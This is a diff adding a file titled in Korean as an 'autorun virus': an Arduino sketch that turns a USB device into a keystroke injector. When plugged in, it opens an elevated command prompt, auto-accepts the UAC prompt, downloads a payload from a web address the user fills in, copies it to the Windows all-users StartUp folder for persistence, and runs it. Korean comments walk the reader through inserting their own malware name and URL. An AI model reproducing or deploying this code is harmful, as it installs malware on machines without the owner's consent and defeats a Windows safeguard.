@@ -1,0 +1,63 @@
+오토런 바이러스
+
+▼ 코드
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  Keyboard.begin();
+  delay(2000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+
+  Keyboard.print("powershell Start-Process cmd -Verb RunAs");
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+  delay(1500);
+  // 여기까지는 누구나 동일
+
+  // 아래 코드에서 악성프로그램파일명을 자신의 악성프로그램 파일명으로 변경
+  Keyboard.print("erase /Q \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\악성코드파일명\"");
+
+  typeKey(KEY_RETURN);
+  
+  // 아래 코드에서 악성프로그램이 저장될 폴더명 부분을 자신이 임의로 지정
+  Keyboard.print("mkdir %TEMP%\\악성프로그램이 저장될 폴더명");
+  typeKey(KEY_RETURN);
+
+  // 1. 아래 코드에서 악성프로그램이 저장될 폴더명을 자신이 바로 위 코드에서 지정했던 폴더명으로 변경
+  // 2. 아래 코드에서 자신의악성코드를 다운로드받을수 있는 웹주소를 변경
+  // 3. 아래 코드에서 저장될 악성프로그램명을 지정 (웬만하면 악성코드 파일명과 일치시킬것을 추천)
+  Keyboard.print("cd %TEMP%\\악성프로그램이 저장될 폴더명 && powershell (new-object System.Net.WebClient).DownloadFile('자신의악성프로그램을 다운로드받을수 있는 웹주소','저장될 악성프로그램명')");
+  typeKey(KEY_RETURN);
+
+  // 1. 악성프로그램명을 자신의 악성프로그램명으로 변경
+  // 2. 1과 동일
+  Keyboard.print("copy \"악성프로그램명\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\" && start 악성프로그램명");
+  typeKey(KEY_RETURN);
+  Keyboard.print("exit");
+  typeKey(KEY_RETURN);
+
+  Keyboard.end();
+}
+
+
+/* Unused endless loop */
+void loop() {}﻿
+ 
